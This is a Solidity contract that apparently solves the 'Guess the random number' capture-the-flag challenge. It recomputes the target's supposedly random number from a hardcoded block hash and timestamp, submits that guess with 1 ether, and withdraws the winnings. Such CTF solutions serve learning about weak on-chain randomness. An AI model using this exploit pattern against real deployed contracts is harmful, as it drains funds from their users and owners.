// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IGuessTheRandomNumberChallenge {
  function guess(uint8) external payable;
}

contract GuessTheRandomNumberSolver {

  IGuessTheRandomNumberChallenge public _interface;

  bytes32 public previousBlockHash = 0xd3841d281914e2fc68c430b2693f08bffdb215e53492ade3166c6cb671bb20df;
  uint public previousTimestamp = 1660432584;
  
  constructor(address _interfaceAddress) {
    require(_interfaceAddress != address(0), "Address can not be Zero");
    _interface = IGuessTheRandomNumberChallenge(_interfaceAddress);
  }
  function solve() public payable {
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(previousBlockHash, previousTimestamp))));
    _interface.guess{value: 1 ether}(answer);
  }
  function getBalance() public view returns(uint){
    return address(this).balance;
  }
  function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
  }
  receive() external payable {}
}